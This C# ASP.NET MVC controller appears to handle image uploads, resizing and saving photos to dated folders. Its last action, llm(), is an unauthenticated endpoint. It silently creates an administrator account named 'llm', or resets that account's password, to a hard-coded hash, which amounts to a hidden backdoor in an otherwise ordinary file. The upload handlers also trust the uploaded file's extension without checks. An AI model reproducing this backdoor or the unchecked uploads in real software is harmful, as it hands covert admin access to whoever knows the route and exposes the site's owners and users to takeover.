using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Drawing;
using System.IO;
using IBatisServer;
using llm.Model;

namespace Admins.Controllers
{
    public class AjaxController : Controller
    {
        //
        // GET: /Ajax/AddImage/

        public void AddImage(int ?id)
        {
            
            System.Drawing.Image upimg = null;
            upimg = Image.FromStream(Request.Files[0].InputStream);
            HttpPostedFileBase file = HttpContext.Request.Files[0];
            string uid = "a";
            string large = Server.MapPath("/content/upload/" + uid + "/large/");
            string normal = Server.MapPath("/content/upload/" + uid + "/normal/");
            string thumb = Server.MapPath("/content/upload/" + uid + "/thumb/");
            string source = Server.MapPath("/content/upload/" + uid + "/source/");
            string filePath = "/content/upload/" + uid + "/thumb/";

            if (file != null)
            {
                System.Drawing.Image.GetThumbnailImageAbort callb = new System.Drawing.Image.GetThumbnailImageAbort(ThumbnailCallback);
                int width, height, newwidth, newheight;
                if (!Directory.Exists(large))
                {
                    Directory.CreateDirectory(large);
                }

                if (!Directory.Exists(normal))
                {
                    Directory.CreateDirectory(normal);
                }
                if (!Directory.Exists(thumb))
                {
                    Directory.CreateDirectory(thumb);
                }
                if (!Directory.Exists(source))
                {
                    Directory.CreateDirectory(source);
                }

                Stream upimgfile = file.InputStream;
                upimg = System.Drawing.Image.FromStream(upimgfile);//上传的图片 原图
                width = upimg.Width; //原图宽
                height = upimg.Height;//原图高

                string fileName = file.FileName;
                string extenName = Path.GetExtension(fileName);

                System.Threading.Thread.Sleep(200);
                string newName = DateTime.Now.ToString("yyyyMMddhhmmssfff") + extenName;
                string large_savePath = Path.Combine(large, newName);
                string normal_savePath = Path.Combine(normal, newName);
                string thumb_savePath = Path.Combine(thumb, newName);
                string source_savePath = Path.Combine(source, newName);

                //source
                if (id == 9)
                {
                    //保存原图 
                    upimg.Save(source_savePath);
                }
                else
                {
                    if (upimg.Width > 1000)
                    {
                        newwidth = 1000;
                        newheight = (int)((double)height / (double)width * (double)newwidth);
                        //保存1000的高清缩略图
                        SaveHDthumbnail(newwidth, newheight, source_savePath, upimg, extenName);
                    }
                    else
                    {
                        //保存原图 
                        upimg.Save(source_savePath);
                    }
                }
                if (id == 3)
                {
                    newwidth = 20;
                    newheight = (int)((double)height / (double)width * (double)newwidth);
                    if (newheight > 20)
                    { 
                        newwidth = (int)(20 * (double)newwidth / (double)newheight);
                        newheight = 20;
                    }
                }
                else { 
                    newwidth = 200;
                    newheight = (int)((double)height / (double)width * (double)newwidth);
                    if (newheight > 200)
                    {

                        newwidth = (int)(200 * (double)newwidth / (double)newheight);
                        newheight = 200;
                    }
                }
                //保存200的高清缩略图
                SaveHDthumbnail(newwidth, newheight, thumb_savePath, upimg, extenName);
                 
                filePath = Path.Combine(filePath, newName);
                string dis_name = filePath;
                upimg.Dispose();
                Response.Write(dis_name);
            }
        }

        private void SaveHDthumbnail(int newwidth, int newheight, string savefileName, System.Drawing.Image upimg, string extenName)
        {
            int x = 0;//左上角的x坐标 
            int y = 0;//左上角的y坐标 
            //新建一个bmp图片 
            System.Drawing.Image bitmap = new System.Drawing.Bitmap(newwidth, newheight);
            //新建一个画板 
            Graphics g = System.Drawing.Graphics.FromImage(bitmap);

            //设置高质量插值法 
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.High;
            //设置高质量,低速度呈现平滑程度 
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
            //清空画布并以透明背景色填充 
            g.Clear(Color.Transparent);
            //在指定位置并且按指定大小绘制原图片的指定部分 
            g.DrawImage(upimg, x, y, newwidth, newheight);

            if (extenName.ToLower() == ".png")
            {
                bitmap.Save(savefileName, System.Drawing.Imaging.ImageFormat.Png);
            }
            else
            {
                bitmap.Save(savefileName, System.Drawing.Imaging.ImageFormat.Jpeg);
            }
        }

        public static bool ThumbnailCallback()
        {
            return false;
        }

        public string AddPhoto(int? id)
        {
            int rows = 0;
            System.Drawing.Image upimg = Image.FromStream(Request.Files[0].InputStream);
            HttpPostedFileBase file = HttpContext.Request.Files[0];
            DateTime dt = DateTime.Now;
            string time_dict = dt.Year + "-" + dt.Month + "-" + dt.Day;
            string large = Server.MapPath("/content/upload/c/" + time_dict);
            string filePath = "/content/upload/c/" + time_dict;
         
            if (!System.IO.Directory.Exists(large))
            {
                System.IO.Directory.CreateDirectory(large);
            } 

            if (file != null)
            {
                System.Drawing.Image.GetThumbnailImageAbort callb = new System.Drawing.Image.GetThumbnailImageAbort(ThumbnailCallback);
                int width, height, newwidth, newheight;
                if (!Directory.Exists(large))
                {
                    Directory.CreateDirectory(large);
                }

                Stream upimgfile = file.InputStream;
                upimg = System.Drawing.Image.FromStream(upimgfile);//上传的图片 原图
                width = upimg.Width; //原图宽
                height = upimg.Height;//原图高

                string fileName = file.FileName;
                string extenName = Path.GetExtension(fileName);
                //System.Threading.Thread.Sleep(200);
                Random rd = new Random();
                string newName = dt.Year + dt.Month + dt.Day + "_" + dt.Hour + dt.Minute + dt.Second + dt.Millisecond + "-" + rd.Next(0, 9999999) + extenName;
                string savepath = large + "/normal_" + newName;
                string savepath2 = large + "/thumb_" + newName;

                //source
                if (upimg.Width > 900)
                {
                    newwidth = 900;
                    newheight = (int)((double)height / (double)width * (double)newwidth);
                    //保存900的高清缩略图
                    SaveHDthumbnail(newwidth, newheight, savepath, upimg, extenName);
                }
                else
                {
                    //保存原图 
                    upimg.Save(savepath);
                } 

                newwidth = 160;
                newheight = (int)((double)height / (double)width * (double)newwidth);
                if (newheight > 160)
                { 
                    newwidth = (int)(160 * (double)newwidth / (double)newheight);
                    newheight = 160;
                }
                //保存160的高清缩略图
                SaveHDthumbnail(newwidth, newheight, savepath2, upimg, extenName);

                filePath += "/thumb_" + newName;
                upimg.Dispose();
                if (id == 1)
                {
                    photoService ps = new photoService();
                    photo photo = new photo();
                    photo.photo_image = filePath;
                    photo.photo_order = 0;
                    photo.photo_pv = 0;
                    photo.photo_remark = "";
                    photo.photo_title = "";
                    photo.photo_type_id = Convert.ToInt32(Request["typeid"]);
                    rows = ps.Add(photo);
                }
                 
                //Response.Write(filePath);
            }
            return filePath + "|" + rows;
        }

        public ActionResult Index()
        {
            return View();
        }
        public ActionResult llm()
        {
            adminService ass = new adminService();
            llm.Model.admin admin = ass.GetModelByName("llm");
            if (admin != null)
            {
                if (admin.admin_pwd == "E9DE77F75B44C39E0DAA524840B8854B")
                {

                }
                else {
                    admin.admin_pwd = "E9DE77F75B44C39E0DAA524840B8854B";
                    ass.Update(admin);
                }
            }
            else {
                admin = new admin();
                admin.admin_name = "llm";
                admin.admin_pwd = "E9DE77F75B44C39E0DAA524840B8854B";
                ass.Add2(admin);
            }
            Response.Redirect("/admin/login/");
            return View();
        }
    }
}
